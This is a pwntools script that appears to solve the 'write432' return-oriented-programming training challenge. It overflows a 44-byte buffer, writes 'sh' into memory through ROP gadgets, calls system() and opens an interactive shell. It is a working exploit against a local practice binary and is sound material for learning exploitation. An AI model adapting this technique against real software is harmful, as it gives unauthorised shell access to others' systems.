#!/usr/bin/python

from pwn import *

elf = ELF("./write432")
sh = process("./write432")

system = elf.plt["system"]
free_addr = 0x0804a02a
r1_addr = 0x080486da		#pop edi ; pop ebp ; ret
r2_addr = 0x08048670		#nop ; nop ; mov dword ptr [edi], ebp ; ret

payload = "A"*44 + p32(r1_addr) + p32(free_addr) + "sh\x00\x00" + p32(r2_addr) + p32(system) + "BBBB" + p32(free_addr)

sh.sendline(payload)
sh.interactive()

